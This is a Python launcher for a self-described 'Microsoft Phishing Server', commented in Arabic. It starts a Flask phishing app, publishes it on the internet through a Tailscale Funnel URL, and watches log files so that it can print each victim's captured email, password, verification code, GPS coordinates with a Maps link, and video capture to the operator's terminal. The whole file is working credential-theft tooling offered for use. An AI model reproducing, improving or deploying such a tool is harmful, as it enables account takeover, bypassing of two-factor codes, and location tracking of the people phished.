#!/usr/bin/env python3
import os
import sys
import time
import json
import subprocess
import threading
import shutil
import signal
import re
import requests
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# ألوان مايكروسوفت
MS_BLUE = '\033[38;2;0;120;212m'
MS_RED = '\033[38;2;242;80;34m'
MS_GREEN = '\033[38;2;127;186;0m'
MS_YELLOW = '\033[38;2;255;185;0m'
RESET = '\033[0m'
BOLD = '\033[1m'
BG_DARK = '\033[48;2;32;32;32m'

# Global variable to hold the active Tailscale Funnel process
_active_funnel_process = None

# شعار مايكروسوفت
def print_banner():
    banner = f"""
    {MS_BLUE}{BOLD}
░▒▓██████████████▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░    ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░         ░▒▓█▓▒░     
{RESET}
    {MS_BLUE}{BOLD}╔═══════════════════════════════════════════════════╗{RESET}
    {MS_BLUE}{BOLD}║                                                   ║{RESET}
    {MS_BLUE}{BOLD}║             Microsoft Phishing Server             ║{RESET}
    {MS_BLUE}{BOLD}║               Advanced Launcher v1.0              ║{RESET}
    {MS_BLUE}{BOLD}║                                                   ║{RESET}
    {MS_BLUE}{BOLD}╚═══════════════════════════════════════════════════╝{RESET}
    
    {MS_GREEN}[*] Server starting on http://localhost:5000{RESET}
    {MS_YELLOW}[*] Press Ctrl+C to stop the server{RESET}
    """
    print(banner)

# تتبع ملفات السجلات
class LogWatcher(FileSystemEventHandler):
    def __init__(self, display_callback):
        self.display_callback = display_callback
        self.last_processed = {}
        
    def on_modified(self, event):
        if not event.is_directory and event.src_path.endswith('.json') and 'logs/' in event.src_path:
            # تأخير قصير للتأكد من اكتمال الكتابة
            time.sleep(0.1)
            self.display_callback(event.src_path)

# عرض بيانات المستخدم بتنسيق جميل
def display_user_data(log_file):
    try:
        with open(log_file, 'r') as f:
            data = json.load(f)
        
        email = data.get('email', 'unknown')
        password = data.get('password', 'N/A')
        verification_code = data.get('verification_code', 'N/A')
        location_data = data.get('location', {})
        
        # احصل على عرض الطرفية
        term_width = shutil.get_terminal_size().columns
        
        # طباعة إطار العنوان
        print("\n" + "=" * term_width)
        print(f"{MS_BLUE}{BOLD}📊 USER DATA CAPTURED: {MS_RED}{email}{RESET}")
        print("=" * term_width)
        
        # معلومات تسجيل الدخول
        print(f"{MS_GREEN}{BOLD}📧 LOGIN INFORMATION:{RESET}")
        print(f"  {MS_BLUE}Email:{RESET}    {MS_RED}{email}{RESET}")
        print(f"  {MS_BLUE}Password:{RESET} {MS_RED}{password}{RESET}")
        
        # رمز التحقق
        if verification_code != 'N/A':
            print(f"\n{MS_GREEN}{BOLD}🔐 VERIFICATION CODE:{RESET}")
            print(f"  {MS_BLUE}Code:{RESET}     {MS_RED}{verification_code}{RESET}")
        
        # معلومات الموقع
        if location_data:
            print(f"\n{MS_GREEN}{BOLD}📍 LOCATION DATA:{RESET}")
            google_maps = location_data.get('google_maps_link', 'N/A')
            if google_maps != 'N/A':
                print(f"  {MS_BLUE}Maps Link:{RESET} {MS_YELLOW}{google_maps}{RESET}")
            
            loc = location_data.get('location', {})
            if loc:
                lat = loc.get('latitude', 'N/A')
                lng = loc.get('longitude', 'N/A')
                accuracy = loc.get('accuracy', 'N/A')
                print(f"  {MS_BLUE}Latitude:{RESET}  {lat}")
                print(f"  {MS_BLUE}Longitude:{RESET} {lng}")
                print(f"  {MS_BLUE}Accuracy:{RESET}  {accuracy}m")
        
        # معلومات الفيديو
        if 'video_filename' in data:
            print(f"\n{MS_GREEN}{BOLD}📹 VIDEO CAPTURED:{RESET}")
            print(f"  {MS_BLUE}File:{RESET}     {MS_YELLOW}{data['video_filename']}{RESET}")
            print(f"  {MS_BLUE}Captured:{RESET} {data.get('video_captured_at', 'N/A')}")
        
        print("=" * term_width + "\n")
    except Exception as e:
        print(f"{MS_RED}Error displaying user data: {str(e)}{RESET}")

# مراقبة جميع ملفات السجلات الموجودة
def check_existing_logs():
    if os.path.exists('logs'):
        for file in os.listdir('logs'):
            if file.endswith('.json'):
                display_user_data(os.path.join('logs', file))

# بدء مراقبة ملفات السجلات
def start_log_watcher():
    observer = Observer()
    event_handler = LogWatcher(display_user_data)
    observer.schedule(event_handler, path='logs', recursive=False)
    observer.start()
    return observer

# وظيفة معالجة الخروج بأمان
def signal_handler(sig, frame):
    print(f"\n{MS_YELLOW}[*] Shutting down server...{RESET}")
    stop_tailscale_funnel()
    if 'flask_process' in globals() and flask_process.poll() is None:
        flask_process.terminate()
    sys.exit(0)

# وظيفة متابعة قراءة مخرجات Flask
def read_flask_output(process):
    while True:
        line = process.stdout.readline()
        if not line and process.poll() is not None:
            break
        if line:
            line = line.decode('utf-8', errors='replace').strip()
            # تجاهل سجلات Flask الاعتيادية
            if '[!]' in line or '[+]' in line:
                print(line)

# --- Tailscale Funnel Functions (Copied and adapted from zarga.py) ---
def check_tailscale_status():
    """Checks if tailscale is running and connected (tailscale up)."""
    print(f"{MS_YELLOW}[*] Checking Tailscale status...{RESET}")
    try:
        status_command = ["tailscale", "status", "--json"]
        status_process = subprocess.run(status_command, capture_output=True, text=True, encoding='utf-8', check=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
        status_output = status_process.stdout
        status_json = json.loads(status_output)

        if "BackendState" in status_json and status_json["BackendState"] == "Running":
            if "Self" in status_json and "Online" in status_json["Self"] and status_json["Self"]["Online"]:
                print(f"{MS_GREEN}[+] Tailscale is UP and connected!{RESET}")
                return True
            else:
                print(f"{MS_YELLOW}[!] Tailscale backend is running, but not yet online/connected.{RESET}")
        else:
            print(f"{MS_RED}[!] Tailscale is DOWN. Please run 'tailscale up' to connect.{RESET}")
    except FileNotFoundError:
        print(f"{MS_RED}[!] Tailscale command not found. Please ensure Tailscale is installed and in your PATH.{RESET}")
    except json.JSONDecodeError:
        print(f"{MS_RED}[!] Error parsing Tailscale status JSON output. Tailscale might not be logged in or running.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{MS_RED}[!] Error running tailscale status: {e.stderr}{RESET}")
    except Exception as e:
        print(f"{MS_RED}[!] An unexpected error occurred while checking Tailscale status: {str(e)}{RESET}")
    return False

def start_tailscale_funnel_and_get_url(port, timeout=30):
    """Starts tailscale funnel on the given port and attempts to capture its URL."""
    global _active_funnel_process
    print(f"{MS_YELLOW}[*] Attempting to start Tailscale Funnel on port {port}...{RESET}")
    funnel_url = "N/A"

    try:
        # Reset any existing funnels on this port before starting a new one
        print(f"{MS_YELLOW}[*] Resetting Tailscale Funnel before starting...{RESET}")
        subprocess.run(["tailscale", "funnel", "reset"], capture_output=True, text=True, check=False, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
        time.sleep(1) # Give it a moment to reset

        # Do NOT use --bg here, we want to capture output directly for debugging.
        # For Windows, use creationflags=subprocess.CREATE_NEW_CONSOLE or 0 to keep it in current console.
        command_args = ["tailscale", "funnel", str(port)]
        print(f"{MS_BLUE}[DEBUG] Funnel command: {' '.join(command_args)}{RESET}")

        _active_funnel_process = subprocess.Popen(
            command_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1, # Line-buffered output
            # Removed creationflags=subprocess.CREATE_NO_WINDOW and shell=True for better output capture
        )

        start_time = time.time()
        output_buffer = ""

        print(f"{MS_YELLOW}[*] Waiting for Tailscale Funnel output...{RESET}")
        while time.time() - start_time < timeout:
            line = _active_funnel_process.stdout.readline()
            if line:
                output_buffer += line
                print(f"{MS_BLUE}[FUNNEL_OUTPUT] {line.strip()}{RESET}") # Print all funnel output
                match = re.search(r"(https?://[a-zA-Z0-9.-]+\.ts\.net/)", line)
                if match:
                    funnel_url = match.group(1)
                    print(f"{MS_GREEN}[+] Tailscale Funnel started successfully. URL: {funnel_url}{RESET}")
                    # Once URL is found, we should terminate this Popen and restart it with --bg
                    _active_funnel_process.terminate()
                    _active_funnel_process.wait(timeout=5)
                    print(f"{MS_YELLOW}[*] Restarting Funnel in background...{RESET}")
                    # Restart with --bg now that we have the URL
                    if sys.platform == 'win32':
                        _active_funnel_process = subprocess.Popen(["start", "/b", "tailscale", "funnel", str(port)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    else:
                        _active_funnel_process = subprocess.Popen(["setsid"] + ["tailscale", "funnel", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    return funnel_url
            poll = _active_funnel_process.poll()
            if poll is not None:
                stderr_output = _active_funnel_process.stderr.read()
                if stderr_output:
                    print(f"{MS_RED}[!] Tailscale Funnel Error (process exited): {stderr_output.strip()}{RESET}")
                else:
                    print(f"{MS_RED}[!] Tailscale Funnel process exited with code {poll} (no stderr).{RESET}")
                return "N/A" # Process exited, funnel did not start
            time.sleep(0.5)

        print(f"{MS_RED}[!] Tailscale Funnel did not return a URL within {timeout} seconds. Output buffer: {output_buffer.strip()}{RESET}")
        if _active_funnel_process and _active_funnel_process.poll() is None:
            _active_funnel_process.terminate()
            try:
                _active_funnel_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                _active_funnel_process.kill()
        return "N/A"
    except FileNotFoundError:
        print(f"{MS_RED}[!] Tailscale command not found. Please ensure Tailscale is installed and in your PATH.{RESET}")
        return "N/A"
    except Exception as e:
        print(f"{MS_RED}[!] An error occurred during Tailscale Funnel startup: {str(e)}{RESET}")
        return "N/A"

def stop_tailscale_funnel():
    """Stop the active Tailscale Funnel process."""
    global _active_funnel_process
    if _active_funnel_process and _active_funnel_process.poll() is None:
        print(f"{MS_YELLOW}[*] Stopping active Tailscale Funnel process...{RESET}")
        try:
            # For processes started with Popen, terminate is the way to stop it.
            _active_funnel_process.terminate()
            _active_funnel_process.wait(timeout=5)
            if _active_funnel_process.poll() is None:
                _active_funnel_process.kill()
            print(f"{MS_GREEN}[+] Tailscale Funnel process stopped.{RESET}")
        except Exception as e:
            print(f"{MS_RED}[!] Error stopping Tailscale Funnel process: {e}{RESET}")
        _active_funnel_process = None
    else:
        print(f"{MS_YELLOW}[*] No active Tailscale Funnel process to stop.{RESET}")

def get_port_from_app_file(app_path):
    """Attempts to extract a port number from an app.py file."""
    try:
        with open(app_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        patterns = [
            r"app\.run\(.*port=(\d+).*",  # Flask app.run(port=XXXXX)
            r"port\s*=\s*(\d+)", # generic port = XXXXX
            r"localhost:(\d+)", # localhost:XXXXX
            r"127\.0\.0\.1:(\d+)", # 127.0.0.1:XXXXX
            r"Server starting on http://localhost:(\d+)", # logs from Flask
            r"[\'\"](\d{4,5})[\'\"]" # Match 4 or 5 digit numbers in quotes (e.g. '8000')
        ]

        for pattern in patterns:
            match = re.search(pattern, content)
            if match:
                port = int(match.group(1))
                print(f"{MS_BLUE}[DEBUG] Detected app.py port: {port}{RESET}")
                return port

        print(f"{MS_YELLOW}[!] Could not find port in {os.path.basename(app_path)}. Defaulting to 5000.{RESET}")
        return 5000 # Default if not found
    except FileNotFoundError:
        print(f"{MS_RED}[!] {os.path.basename(app_path)} not found at {app_path}{RESET}")
        return None
    except Exception as e:
        print(f"{MS_RED}[!] Error reading {os.path.basename(app_path)} for port: {e}{RESET}")
        return None

if __name__ == "__main__":
    # ضبط معالج الإشارات للخروج النظيف
    signal.signal(signal.SIGINT, signal_handler)
    
    # طباعة الشعار
    print_banner()
    
    # التأكد من وجود المجلدات المطلوبة
    os.makedirs('logs', exist_ok=True)
    os.makedirs('uploads', exist_ok=True)
    
    # التحقق من ملفات السجلات الموجودة
    # check_existing_logs()  # تم تعطيل هذه الميزة
    
    # بدء مراقبة ملفات السجلات
    observer = start_log_watcher()
    
    # تهيئة متغير العملية ليكون None في حالة الفشل
    flask_process = None
    funnel_url = "N/A"
    
    try:
        # Check and potentially activate Tailscale
        if not check_tailscale_status():
            print(f"{MS_YELLOW}[*] Attempting to bring Tailscale up...{RESET}")
            try:
                # This command will usually open a browser for login if not logged in
                subprocess.run(["tailscale", "up"], check=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                print(f"{MS_GREEN}[+] Tailscale 'up' command executed. Please check your browser for login if prompted.{RESET}")
                time.sleep(5) # Give it some time to come online
                if not check_tailscale_status():
                    print(f"{MS_RED}[!] Tailscale is still not active after 'up' command. Please log in manually.{RESET}")
            except FileNotFoundError:
                print(f"{MS_RED}[!] Tailscale command not found for 'up'. Please install Tailscale.{RESET}")
            except subprocess.CalledProcessError as e:
                print(f"{MS_RED}[!] Error running 'tailscale up': {e.stderr}{RESET}")
            except Exception as e:
                print(f"{MS_RED}[!] An unexpected error occurred during 'tailscale up': {str(e)}{RESET}")

        # بدء تشغيل تطبيق Flask - المسار الصحيح في نفس المجلد
        app_path = os.path.join(os.path.dirname(__file__), 'app.py')
        app_port = get_port_from_app_file(app_path)

        if app_port:
            funnel_url = start_tailscale_funnel_and_get_url(app_port)
            if funnel_url != "N/A":
                print(f"{MS_GREEN}[+] Tailscale Funnel URL: {funnel_url}{RESET}")
            else:
                print(f"{MS_RED}[!] Failed to start Tailscale Funnel or get URL. Continuing without funnel.{RESET}")
        else:
            print(f"{MS_RED}[!] Could not determine app.py port. Cannot start Funnel. Continuing without funnel.{RESET}")

        flask_process = subprocess.Popen(
            [sys.executable, 'app.py'], # Use sys.executable to ensure correct Python env
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        
        # بدء سلسلة لقراءة مخرجات Flask
        output_thread = threading.Thread(target=read_flask_output, args=(flask_process,))
        output_thread.daemon = True
        output_thread.start()
        
        # انتظار انتهاء العملية
        while flask_process and flask_process.poll() is None:
            time.sleep(0.1)
            
    except Exception as e:
        print(f"{MS_RED}Error starting Flask server: {str(e)}{RESET}")
        print(f"{MS_YELLOW}Check if app.py exists in the current directory.{RESET}")
        
    except KeyboardInterrupt:
        pass
        
    finally:
        # إيقاف مراقب الملفات
        observer.stop()
        observer.join()
        
        # إيقاف عملية Flask إذا كانت لا تزال قيد التشغيل
        if flask_process and flask_process.poll() is None:
            flask_process.terminate()
            flask_process.wait()
        
        # إيقاف Tailscale Funnel
        stop_tailscale_funnel()
        
        print(f"{MS_GREEN}[+] Server stopped successfully.{RESET}") 